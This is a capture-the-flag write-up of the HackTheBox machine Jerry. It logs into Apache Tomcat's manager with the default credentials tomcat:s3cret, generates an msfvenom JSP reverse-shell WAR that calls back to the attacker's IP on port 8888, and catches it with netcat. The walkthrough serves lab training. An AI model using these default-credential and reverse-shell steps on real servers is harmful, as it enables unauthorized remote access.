# Jerry

## Overview

Hello everyone, In this blog we are going to solve Jerry from HackTheBox.

Link for the machine : [https://app.hackthebox.com/machines/Jerry](https://app.hackthebox.com/machines/Jerry)

Lets Start ðŸ™Œ

Connect to the HTB server by using the OpenVpn configuration file thatâ€™s generated by HTB.

\[ [Click Here](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access) to learn more about how to connect to vpn and access the boxes. ]

After connecting to the vpn service, click on Join Machine to access the machineâ€™s ip.

After joining the machine you can see the IP Address of the target machine.

***

## Reconnaissance

### Rustscan

First start the reconnaissance by running `rustscan` on the target IP address.

Command: `rustscan -a 10.10.10.95 -- -A -T4 -v -Pn`

<figure><img src="../.gitbook/assets/Untitled (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Untitled 1 (14).png" alt=""><figcaption></figcaption></figure>

### Results

From the results of `rustscan`, we can see that on port `8080`, Apache Tomcat service is running.

***

## Information Gathering - Port 8080

I visited the web server running on `http://10.10.10.95:8080/`.

<figure><img src="../.gitbook/assets/Untitled 2 (14).png" alt=""><figcaption></figcaption></figure>

We can see the default home page of the Apache Tomcat server. I started exploring by clicking all the buttons and links in the home page.

<figure><img src="../.gitbook/assets/Untitled 3 (14).png" alt=""><figcaption></figcaption></figure>

I clicked the Manager App button and it redirected me to the following link: [http://10.10.10.95:8080/manager/html](http://10.10.10.95:8080/manager/html), which prompted me for a username and password:

<figure><img src="../.gitbook/assets/Untitled 4 (13).png" alt=""><figcaption></figcaption></figure>

On investigating about the above URL, I found this&#x20;

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#default-credentials" %}

<figure><img src="../.gitbook/assets/Untitled 5 (13).png" alt=""><figcaption></figcaption></figure>

***

## Enumeration - Port 8080

I tried `admin:admin` combination in the prompt and it thrown me the following error:

<figure><img src="../.gitbook/assets/Untitled 6 (13).png" alt=""><figcaption></figcaption></figure>

From the above error, we can see that they have shown a example, in which they have used `tomcat:s3cret` combination. Letâ€™s give it a try with this combination.

<figure><img src="../.gitbook/assets/Untitled 7 (10).png" alt=""><figcaption></figcaption></figure>

It worked and we got access to the Application Manager.

Further surfing the Application Manager, we can see that there is an option to upload files of type WAR.

<figure><img src="../.gitbook/assets/Untitled 8 (10).png" alt=""><figcaption></figcaption></figure>

***

## Initial Access

We can generate a `msfvenom` reverse shell and upload it as mentioned here:&#x20;

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#msfvenom-reverse-shell" %}

<figure><img src="../.gitbook/assets/Untitled 9 (9).png" alt=""><figcaption></figcaption></figure>

Generate the Reverse Shell using the following command:

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<HTB_tun_IP> LPORT=8888 -f war -o revshell.war`

<figure><img src="../.gitbook/assets/Untitled 10 (9).png" alt=""><figcaption></figcaption></figure>

Now upload this `revshell.war` file and click deploy.

<figure><img src="../.gitbook/assets/Untitled 11 (9).png" alt=""><figcaption></figcaption></figure>

Now if we check the Applications table, we can see that a new path `/revshell` is generated.

<figure><img src="../.gitbook/assets/Untitled 12 (9).png" alt=""><figcaption></figcaption></figure>

Before clicking or viewing the `/revshell` link, start a `netcat` listener on your attack box / local machine on port `8888`

<figure><img src="../.gitbook/assets/Untitled 13 (9).png" alt=""><figcaption></figcaption></figure>

Now click the `/revshell` and check the `netcat` listener.

<figure><img src="../.gitbook/assets/Untitled 14 (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Untitled 15 (7).png" alt=""><figcaption></figcaption></figure>

We have successfully got access to the target machine.

***

## Getting the Flags

Now we have to look out for the flags. I started surfing the machine. I visited the `C:\Users` directory and found the following users:

<figure><img src="../.gitbook/assets/Untitled 16 (6).png" alt=""><figcaption></figcaption></figure>

I checked the Administrator directory. In the Desktop folder of Administrator found the `flags` directory.

<figure><img src="../.gitbook/assets/Untitled 17 (4).png" alt=""><figcaption></figcaption></figure>

The flags directory had a file named `2 for the price of 1.txt`.

You can view the contents of the `2 for the price of 1.txt` file using the command: `more "2 for the price of 1.txt"`

<figure><img src="../.gitbook/assets/Untitled 18 (4).png" alt=""><figcaption></figcaption></figure>

We have successfully found both the user and root flags.

Thank You !!!!!!!
